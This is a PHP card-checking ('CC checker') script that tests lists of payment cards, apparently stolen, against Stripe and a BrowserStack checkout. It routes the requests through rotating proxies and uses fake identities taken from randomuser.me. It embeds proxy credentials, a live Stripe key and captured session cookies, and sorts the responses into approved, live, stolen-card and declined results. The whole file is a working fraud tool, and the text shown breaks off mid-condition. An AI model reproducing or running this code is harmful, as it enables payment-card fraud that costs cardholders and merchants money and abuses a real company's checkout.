<?php

#---------------------------------------------------------------------------------------------------------------------------------#
#---------------------------------------------------[MADE BY 𝑫𝑹𝑨𝑮𝑶𝑵#𝑴𝑨𝑺𝑻𝑬𝑹]----------------------------------------------------#
#---------------------------------------------------------------------------------------------------------------------------------#
 

require 'function.php';

error_reporting(0);
date_default_timezone_set('Asia/Jakarta');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

////////////////////////////===[Randomizing Details Api]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\:\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];
/////////////////////==============[Init Proxy Section]===============//////////////////////////////
///////////////////////////===[Webshare proxys for cc checker]===////////////////////////////////////
$Websharegay = rand(0,250);
$rp1 = array(
  1 => 'qicfkzhx-rotate:wyfuly82xeg8',
    ); 
    $rotate = $rp1[array_rand($rp1)];
//////////////////////////==============[Proxy Section]===============//////////////////////////////
$ch = curl_init('https://api.ipify.org/');
curl_setopt_array($ch, [
CURLOPT_RETURNTRANSFER => true,
CURLOPT_PROXY => 'http://p.webshare.io:80',
CURLOPT_PROXYUSERPWD => $rotate,
CURLOPT_HTTPGET => true,
]);
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();  
if (isset($ip1)){
$ip = "Live! ✅";
}
if (empty($ip1)){
$ip = "Dead![".$rotate."] ❌";
}
echo '[ IP: '.$ip.' ] ';
///////////////////////==============[End Proxy Section]===============//////////////////////////////#-------------------
////////////////////////////===[1ST CURL]
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'path: v1/tokens',
'scheme: https',
'accept: application/json',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[name]='.$name.'+'.$last.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=17d17a3a-2378-40cc-a10c-634c9a57ce5baae7fe&muid=49e3f178-6ed1-464d-a5cf-6e9c36787e1d72993d&sid=df76d0c7-220c-48a2-b727-94d240223c94485362&payment_user_agent=stripe.js%2Ff5c0110cf%3B+stripe-js-v3%2Ff5c0110cf&time_on_page=39425&key=pk_live_40g8bjuzvlOrPg0e4GbbFEGWaD9ehS59BE6vzNgZz59YAHsT5BtwyEBGEWL5PpT2I1qrjSpxS8YOA7bipleQr74Rs000PhWZ1qY&pasted_fields=number');



$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));

# -------------------- [2 REQ] -------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://accounts.browserstack.com/orders');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: accounts.browserstack.com',
'method: POST',
'path: /orders',
'scheme: https',
'accept: text/javascript, application/json',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'cookie: __cf_bm=pfKbATAVUb_1lsVc15zIWes0l34K_tqWdPbXK8sh_wM-1649068721-0-AVCv5wWe9yYQlmRiS2Oyhl01JTn+6ulJljxA77Ue4e8TZHg2wSbBXvS7dN5EzSiKIjrTigtYB9hZFV+ph/5eg0g=; __cfruid=ec2e44a6648c0bf46a0a4844bcb725ea1739e828-1649068721; tracking_id=9bacbd1e-59f4-4314-a68b-382490564c27; moved=1; GAstartTime=1649068732999; bs_deviceId=82676dd6-1bef-0eb0-c9c4-07fd2e1858e8; p_buy=false; ab_users={"45":98,"33":-1,"36":-1,"_allocation":"aab13ce6-716f-4f5d-b4ac-537fd0c43f01","60":129,"57":123,"40":87,"58":125,"59":127,"55":119,"63":133,"48":105,"54":116}; ga_pa_status=npa; _session=094776c249b63110a0228e8313b2e7f0; bs_logging_id=5947878; bs_group_id=5865163; bs_user_details={"user_details":{"user_id":5947878,"group_id":5865163},"plan_details":{"live_testing":{"type":"Trial"},"automate":{"type":"Trial"},"screenshot":{"type":"Trial"},"app_live_testing":{"type":"Trial"},"app_automate":{"type":"Trial"},"percy":{"type":"Trial"},"high_scale_testing":{"type":"Trial"}}}; bs_chat_channels=pricing_chat_without_auto_open; downtime_notified={"notifDowntime":false}; user_binary_or_native_onboarded=true; skipped_extension_install_info_4YAe0a=true; _BEAMER_USER_ID_xTSGUhhN11000=9f3a2e25-d13e-4a0f-847a-7333a012097b; _BEAMER_FIRST_VISIT_xTSGUhhN11000=2022-04-04T10:43:56.446Z; _BEAMER_FILTER_BY_URL_xTSGUhhN11000=true; show_freshchat=2; GAlastSentTime=1649069369762',
'origin: https://www.browserstack.com',
'referer: https://www.browserstack.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36',
   ));

# ----------------- [2req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS,'utf8=%E2%9C%93&authenticity_token=0b%2BdhX2NBsFnfa%2BPVdAcAYo5SJ6fN5pbQXGqfL1IaHN2LZCZuvdGmjhtydP4W9CbXUhQVq3vNJih5xT1SC5G8A%3D%3D&is_from_checkout_page=true&stripeToken='.$id.'&cardDetails=null&is_tax_checkout_page=true&is_single_form_checkout=true&authenticity_token=f444sb1bvUmGJCVTBeEryk8fl%2FrnX3kFvxQqYljUr8nYHDWteiH9Etk0Qw%2BoaudQmG6PMtWH18ZfgpTrrbKBSg%3D%3D');


$result2 = curl_exec($ch);
$info = curl_getinfo($ch);
$time = $info['total_time'];

// this is for additional info - so result will look more good by adding the info of the bin

/////////// [Bin Lookup] /////////////

$ch = curl_init();
$bin = substr($cc, 0,6);
curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/'.$bin.'/');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bindata = curl_exec($ch);
$binna = json_decode($bindata,true);
$brand = $binna['scheme'];
$country = $binna['country']['name'];
$type = $binna['type'];
$bank = $binna['bank']['name'];
curl_close($ch);


# ----------------------------------------------------------- [Responses] ------------------------------------------------------- #



# ------------------------------------------------- [CVV Responses ] ------------------------------------------------------------ #

if
(strpos($result2,  '"cvc_check": "pass"')) {
  echo '</br><span class="badge badge-success">👑 APPROVED! 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE</span> |  <span class="badge badge-warning">{MSG:- CVC MATCHED}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
} 

elseif
(strpos($result2,  "Thank You For Donation.")) {
    echo '</br><span class="badge badge-success">👑 APPROVED! 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">CCV MATCHED {MSG:- Thank You For Donation.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
} 

elseif
(strpos($result2,  '"success:true"')) {
    echo '</br><span class="badge badge-success">👑 APPROVED! 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">CCV MATCHED {MSG:- Thank You For Donation.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
} 

elseif
(strpos($result2,  "Your card does not have sufficient funds. Please update your card details in our payment section.")) {
    echo '</br><span class="badge badge-success">👑 APPROVED! 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">CCV MATCHED {MSG:- NO BALANCE.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
} 

elseif
(strpos($result2,  'Your card zip code is incorrect.')) {
    echo '</br><span class="badge badge-success">👑 APPROVED! 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">CCV MATCHED {MSG:- Your Card Zip Code Is Incorrect.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
} 

elseif
(strpos($result2,  '/donations/thank_you?donation_number=','')) {
    echo '</br><span class="badge badge-success">👑 APPROVED! 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">CCV MATCHED {MSG:- Thank You For Donation. }</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
} 

elseif
(strpos($result2,  "incorrect_zip")) {
    echo '</br><span class="badge badge-success">👑 APPROVED! 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">CCV MATCHED {MSG:- Incorrect Zip}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
} 


elseif
(strpos($result2,  '"type":"one-time"')) {
    echo '</br><span class="badge badge-success">👑 APPROVED! 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">{MSG:- CCV MATCHED}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
} 

# -------------------------------------------------- [CVV Responses END ] ------------------------------------------------------ #



# ----------------------------------------------------- [CCN Responses ] ------------------------------------------------------ #

elseif
(strpos($result2,  'Something went wrong.')) {
    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">CCN LIVE {MSG:- Security Code Is Incorrect.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
}

elseif
(strpos($result2,  'Your cards expiration month is invalid.')) {
    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">CCN LIVE {MSG:- Security Code Is Invalid.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
}

elseif
(strpos($result2,  "Your card's security code is incorrect.")) {
    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">CCN LIVE {MSG:- Your Card&#039;s Security Code Is Incorrect.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
  }

elseif
(strpos($result2,  "incorrect_cvc")) {
    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">CCN LIVE {MSG:- Incorrect CVC.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
}

#----------------------------------------------------- [CCN Responses END ]------------------------------------------------------ #



#--------------------------- [Stolen,Lost,Pickup,Insufficient Funds Responses]--------------------------------------------------- #

elseif
(strpos($result2,  "stolen_card")) {
    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">LIVE {MSG:- Stolen Card.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
}

elseif
(strpos($result2,  "lost_card")) {
    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">LIVE {MSG:- Lost Card.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
}

elseif
(strpos($result2,  'Your card has insufficient funds.')) {
    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">LIVE {MSG:- Your Card Has Insufficient Funds.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
}

elseif
(strpos($result2,  "pickup_card")) {
    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">LIVE {MSG:- Pickup Card.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
}

elseif
(strpos($result2,  "Your card does not have sufficient funds.")) {
    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">LIVE {MSG:- Insufficient Funds.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
}

elseif
(strpos($result2,  '"cvc_check": "fail"')) {
    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">LIVE {MSG:- CVC FAILED.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
}

elseif
(strpos($result2,  'our card expiration month is invalid.')) {
    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">LIVE {MSG:- our cards expiration month is invalid.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
}

# -------------------------------------------------- [Stolen,Lost,Pickup,Insufficient Funds Responses END ] --------------------- #



# --------------------------------------------------- [Reprovada,Decline Responses ] -------------------------------------------- #

elseif
(strpos($result2,  'This card has expired. Please try again with another card.')) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Expired Card</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
  } 

elseif
(strpos($result2,  'Your card number is incorrect.')) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Your Card Number Is Incorrect.</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
  } 

elseif
(strpos($result2,  "incorrect_number")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Your Card Number Is Incorrect.</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
  } 

elseif
(strpos($result2,  'Your transaction was declined. Please contact your bank for more information.')) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Card Was Declined</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
  } 

elseif
(strpos($result2,  "generic_decline")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Generic Decline</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
  } 

elseif
(strpos($result2,  "do_not_honor")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Do Not Honor The Card</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
  } 


elseif
(strpos($result2,  "expired_card")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Expired Card</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
  } 

elseif
(strpos($result2,  'Your card does not support this type of purchase.')) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Your Card Does Not Support This Type Of Purchase.</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
  } 

elseif
(strpos($result2,  "processing_error")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Processing Error</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
  } 

elseif
(strpos($result2, "service_not_allowed")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Service Not Allowed</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
  } 

elseif
(strpos($result2,  '"cvc_check": "unchecked"')) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: CVC Unchecked</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
  } 

elseif
(strpos($result2,  '"cvc_check": "unavailable"')) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: CVC Unavailable </span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
  } 

elseif
(strpos($result2,  "parameter_invalid_empty")) {
